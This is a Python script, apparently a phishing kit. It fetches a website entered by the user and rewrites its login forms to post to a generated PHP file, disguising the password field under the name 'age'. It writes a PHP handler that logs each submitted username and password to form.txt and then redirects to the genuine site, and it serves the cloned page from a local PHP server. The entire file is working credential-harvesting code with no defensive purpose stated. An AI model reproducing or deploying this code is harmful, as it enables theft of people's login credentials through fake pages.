import os
import shutil
import webbrowser
import subprocess
from requests_html import HTMLSession
from bs4 import BeautifulSoup

def modify_form(soup):
    forms = soup.find_all('form')
    
    if not forms:
        return False, None

    for form in forms:
        form['action'] = 'add_data.php'
        form['method'] = 'post'

        inputs = form.find_all('input')
        for input_field in inputs:
            if input_field['type'] == 'text':
                input_field['name'] = 'name'
            elif input_field['type'] == 'password':
                input_field['name'] = 'age'
                input_field['id'] = 'phone-number'

        form['class'] = form.get('class', []) + ['modified-form']
        for button in form.find_all('button', {'type': 'submit'}):
            button['id'] = 'login-button'
            button['class'] = button.get('class', []) + ['disabled']
    
    return True, str(soup)

def create_php_files(output_folder, redirect_url):
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    php_content = f"""<?php
$name = $_POST['name'];
$age = $_POST['age'];

$file = fopen('form.txt', 'a');
fwrite($file, "Username: $name\\nPassword: $age\\n");
fclose($file);

header('Location: {redirect_url}');
exit();
?>
"""
    with open(os.path.join(output_folder, 'add_data.php'), 'w', encoding='utf-8') as f:
        f.write(php_content)

    with open(os.path.join(output_folder, 'form.txt'), 'w', encoding='utf-8') as f:
        f.write("")

def start_php_server(output_folder):
    command = ["php", "-S", "localhost:8000", "-t", output_folder]
    subprocess.Popen(command)
    webbrowser.open("http://localhost:8000/index.html")

def process_website():
    session = HTMLSession()

    while True:
        url = input("Введіть URL сайту: ")
        try:
            response = session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')

            found_form, modified_html = modify_form(soup)
            if not found_form:
                print("Форма не знайдена! Будь ласка, введіть іншу URL.")
            else:
                output_folder = 'output_site'
                if not os.path.exists(output_folder):
                    os.makedirs(output_folder)
                
                with open(os.path.join(output_folder, 'index.html'), 'w', encoding='utf-8') as f:
                    f.write(modified_html)
                
                create_php_files(output_folder, url)
                start_php_server(output_folder)
                break
        except Exception as e:
            print(f"Помилка завантаження сайту: {e}. Спробуйте ще раз.")

if __name__ == '__main__':
    process_website()
